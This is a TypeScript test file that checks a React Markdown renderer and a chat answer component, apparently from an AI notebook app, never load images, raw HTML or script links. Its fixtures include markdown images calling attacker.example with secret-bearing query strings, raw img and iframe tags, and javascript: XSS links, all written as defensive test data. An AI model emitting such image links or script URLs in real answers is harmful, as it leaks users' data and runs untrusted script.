import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import type { Components } from "react-markdown";
import { AnswerText } from "../src/components/chat/AnswerText";
import { isHttpUrl, Markdown } from "../src/components/Markdown";

const render = (markdown: string, components?: Components) =>
  renderToStaticMarkup(<Markdown components={components}>{markdown}</Markdown>);

/** No element that would make a browser issue a request on render. */
function assertNoLoadingElement(html: string) {
  assert.doesNotMatch(html, /<(img|picture|source|video|audio|iframe|object|embed|link|script|style)\b/i, html);
}

/** The same, and no loading attribute either (for input that contains no literal HTML to be shown escaped). */
function assertLoadsNothing(html: string) {
  assertNoLoadingElement(html);
  assert.doesNotMatch(html, /\b(src|srcset|poster|background|style)\s*=/i, html);
}

describe("Markdown never loads images", () => {
  test("an image is replaced by its alt text", () => {
    const html = render("Riders prefer discounts. ![ridership chart](https://attacker.example/p?d=SECRET-FACTS)");
    assertLoadsNothing(html);
    assert.doesNotMatch(html, /attacker\.example/);
    assert.match(html, /ridership chart/);
  });

  test("an image without alt text renders nothing", () => {
    const html = render("Summary.\n\n![](https://attacker.example/p?d=SECRET-FACTS)");
    assertLoadsNothing(html);
    assert.doesNotMatch(html, /attacker\.example/);
    assert.match(html, /Summary\./);
  });

  test("reference-style, titled, relative and data: images are dropped too", () => {
    const html = render(
      [
        "![ref][pixel]",
        "",
        '![titled](https://attacker.example/t.png "a title")',
        "",
        "![same origin](/api/notebooks/n1/guide?refresh=1)",
        "",
        "![inline](data:image/gif;base64,R0lGODlhAQABAAAAACw=)",
        "",
        "[pixel]: https://attacker.example/ref.png",
      ].join("\n"),
    );
    assertLoadsNothing(html);
    assert.doesNotMatch(html, /attacker\.example|\/api\/|data:image/);
  });

  test("a linked image keeps the link and shows the alt text", () => {
    const html = render("[![badge](https://attacker.example/b.png)](https://example.org/landing)");
    assertLoadsNothing(html);
    assert.doesNotMatch(html, /attacker\.example/);
    assert.match(html, /<a href="https:\/\/example\.org\/landing" target="_blank" rel="noreferrer noopener">badge<\/a>/);
  });

  test("raw HTML in the text is shown as text, not rendered", () => {
    const html = render('before <img src="https://attacker.example/raw.png"> <iframe src="https://attacker.example/"></iframe> after');
    assertNoLoadingElement(html);
    // The markup is still there for the reader to see, escaped.
    assert.match(html, /&lt;img src=&quot;https:\/\/attacker\.example\/raw\.png&quot;&gt;/);
    assert.match(html, /&lt;iframe/);
  });

  test("callers cannot re-enable images through `components`", () => {
    const components: Components = { img: (props) => createElement("img", { src: props.src, alt: props.alt }) };
    const html = render("![x](https://attacker.example/p.png)", components);
    assertLoadsNothing(html);
  });
});

describe("Markdown links", () => {
  test("http(s) links open in a new tab with rel=noreferrer noopener", () => {
    const html = render("[docs](https://example.org/page) and http://example.org/auto and www.example.org");
    const anchors = html.match(/<a\b[^>]*>/g) ?? [];
    assert.equal(anchors.length, 3, html);
    for (const anchor of anchors) {
      assert.match(anchor, /href="https?:\/\/(www\.)?example\.org[^"]*"/);
      assert.match(anchor, /target="_blank"/);
      assert.match(anchor, /rel="noreferrer noopener"/);
    }
  });

  test("javascript:, data: and vbscript: links are inert text", () => {
    const html = render(
      [
        "[one](javascript:alert(1))",
        "[two](JaVaScRiPt:alert(1))",
        "[three](data:text/html,<script>alert(1)</script>)",
        "[four](vbscript:msgbox(1))",
        "[five]( javascript:alert(1) )",
        "<javascript:alert(1)>",
      ].join("\n\n"),
    );
    assert.doesNotMatch(html, /<a\b/i, html);
    assert.doesNotMatch(html, /href=/i, html);
    assert.match(html, /one/);
    assert.match(html, /four/);
  });

  test("relative and mailto: links are shown as text, not as links into this app", () => {
    const html = render("[guide](/api/notebooks/n1/guide?refresh=1) [doc](appendix.md) [mail](mailto:someone@example.org)");
    assert.doesNotMatch(html, /<a\b/i, html);
    assert.match(html, /guide/);
    assert.match(html, /mail/);
  });

  test("footnote links stay in the page", () => {
    const html = render("A claim.[^1]\n\n[^1]: The note.");
    const anchors = html.match(/<a\b[^>]*>/g) ?? [];
    assert.ok(anchors.length >= 2, html);
    for (const anchor of anchors) {
      assert.match(anchor, /href="#user-content-fn/);
      assert.doesNotMatch(anchor, /target=/);
    }
  });

  test("isHttpUrl accepts only http(s) URLs", () => {
    assert.equal(isHttpUrl("https://example.org"), true);
    assert.equal(isHttpUrl("HTTP://example.org"), true);
    for (const value of ["javascript:alert(1)", "//example.org", "/path", "mailto:a@b.c", "data:text/html,x", "", " https://example.org"]) {
      assert.equal(isHttpUrl(value), false, JSON.stringify(value));
    }
  });
});

describe("AnswerText (chat answers) goes through the same wrapper", () => {
  test("no image, safe links, citation markers kept", () => {
    const html = renderToStaticMarkup(
      <AnswerText
        text={"Fares rise in May [1]. ![](https://attacker.example/p?d=SECRET) [more](https://example.org/x) [bad](javascript:alert(1))"}
        citations={[{ index: 1, sourceId: "s1", sourceTitle: "Fare proposal", quote: "Fares rise in May" }]}
        onOpenSource={() => {}}
      />,
    );
    assertLoadsNothing(html);
    assert.doesNotMatch(html, /attacker\.example|javascript:/i);
    assert.match(html, /<a href="https:\/\/example\.org\/x" target="_blank" rel="noreferrer noopener">more<\/a>/);
    assert.match(html, /Fare proposal|>1</);
  });
});
